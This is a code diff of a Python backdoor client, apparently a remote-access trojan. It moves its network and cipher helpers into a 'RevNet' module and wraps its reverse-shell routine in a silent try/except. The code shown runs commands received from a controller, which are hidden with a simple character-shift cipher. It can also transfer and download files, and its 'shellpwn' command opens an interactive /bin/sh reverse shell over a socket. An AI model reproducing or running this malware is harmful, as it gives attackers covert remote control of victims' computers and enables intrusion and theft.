@@ -7,6 +7,7 @@ import ctypes
 import urllib
 import tcpall
 import _thread
+import RevNet
 
 HOST="localhost"
 
@@ -16,19 +17,25 @@ s=socket.socket()
 
 def revshell(port):
 
-	global HOST
+	try:
 
-	sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		global HOST
 
-	sck.connect((socket.gethostbyname(HOST), port))
+		sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-	os.dup2(sck.fileno(),0)
+		sck.connect((socket.gethostbyname(HOST), port))
+	
+		os.dup2(sck.fileno(),0)
 
-	os.dup2(sck.fileno(),1)
+		os.dup2(sck.fileno(),1)
 
-	os.dup2(sck.fileno(),2)
+		os.dup2(sck.fileno(),2)
 
-	p = subprocess.call(["/bin/sh", "-i"])
+		p = subprocess.call(["/bin/sh", "-i"])
+
+	except:
+
+		pass
 
 def download(url,fname):
 
@@ -36,75 +43,7 @@ def download(url,fname):
 
     global s
 
-    tcpall.send_all(s,b'ACK')
-
-def frecv(sck):
-
-    fsize=int(sck.recv(1024).decode())
-
-    if(fsize%1024)==0:
-
-        riter=int(fsize/1024)
-
-    else:
-
-        riter=int(fsize/1024)+1
-
-    sck.send(str.encode('ack'))
-
-    fname=sck.recv(1024).decode()
-
-    sck.send(str.encode('ack'))
-
-    fhandle=open(fname,'wb')
-
-    for i in range(riter):
-
-        fhandle.write(sck.recv(1024))
-
-    sck.send(str.encode('ack'))
-
-    fhandle.close()
-
-def dec(txt):
-
-	i=0
-
-	newbuf=''
-
-	char=''
-
-	dec=0
-
-	for i in range(len(txt)):
-
-		dec=ord(txt[i])
-
-		char=chr(dec-4)
-
-		newbuf+=char
-
-	return newbuf
-
-def enc(txt):
-
-	i=0
-
-	newbuf=''
-
-	char=''
-
-	dec=0
-
-	for i in range(len(txt)):
-
-		dec=ord(txt[i])
-
-		char=chr(dec+4)
-
-		newbuf+=char
-
-	return newbuf
+    RevNet.send_all(s,b'ACK')
 
 def reverseconn():
 
@@ -122,37 +61,37 @@ def reverseconn():
 
     while True:
 
-        recvcmd=tcpall.recv_all(s)
+        recvcmd=RevNet.recv_all(s)
 
-        if dec(recvcmd[:2].decode("utf-8"))=="cd":
+        if RevNet.dec(recvcmd[:2].decode("utf-8"))=="cd":
 
             try:
 
-                os.chdir(dec(recvcmd[3:].decode("utf-8")))
+                os.chdir(RevNet.dec(recvcmd[3:].decode("utf-8")))
 
             except:
 
                 pass
 
-            tcpall.send_all(s,str.encode(enc(str(os.getcwd())+'> ')))
+            RevNet.send_all(s,str.encode(RevNet.enc(str(os.getcwd())+'> ')))
 
-        elif dec(recvcmd.decode("utf-8"))=="quit":
+        elif RevNet.dec(recvcmd.decode("utf-8"))=="quit":
 
             break
 
-        elif dec(recvcmd[:6].decode("utf-8"))=="ftrans":
+        elif RevNet.dec(recvcmd[:6].decode("utf-8"))=="ftrans":
 
-            frecv(s)
+            RevNet.frecv(s)
 
-        elif dec(recvcmd[:8].decode("utf-8"))=="download":
+        elif RevNet.dec(recvcmd[:8].decode("utf-8"))=="download":
 
-            download(dec(recvcmd[9:].decode("utf-8")),dec(tcpall.recv_all(s,1024).decode("utf-8")))
+            download(RevNet.dec(recvcmd[9:].decode("utf-8")),RevNet.dec(RevNet.recv_all(s,1024).decode("utf-8")))
 
-        elif dec(recvcmd[:8].decode("utf-8"))=="shellpwn":
+        elif RevNet.dec(recvcmd[:8].decode("utf-8"))=="shellpwn":
 
             try:
 
-                prt=(int(dec(recvcmd[9:].decode("utf-8"))))
+                prt=(int(RevNet.dec(recvcmd[9:].decode("utf-8"))))
 
                 _thread.start_new_thread(revshell,(prt,))
 
@@ -160,17 +99,17 @@ def reverseconn():
 
                 pass
 
-            tcpall.send_all(s,str.encode(enc('PWNED!')))
+            RevNet.send_all(s,str.encode(RevNet.enc('PWNED!')))
 
-        elif len(recvcmd)>0 and dec(recvcmd[:2].decode("utf-8"))!="cd":
+        elif len(recvcmd)>0 and RevNet.dec(recvcmd[:2].decode("utf-8"))!="cd":
 
-            cmd = subprocess.Popen(dec(recvcmd[:].decode("utf-8")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            cmd = subprocess.Popen(RevNet.dec(recvcmd[:].decode("utf-8")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
             obyte=cmd.stdout.read()+cmd.stderr.read()
 
             ostr=obyte.decode()
 
-            tcpall.send_all(s,str.encode(enc(ostr+str(os.getcwd())+'> '),"utf-8"))
+            RevNet.send_all(s,str.encode(RevNet.enc(ostr+str(os.getcwd())+'> ')))
 
     s.close()
 
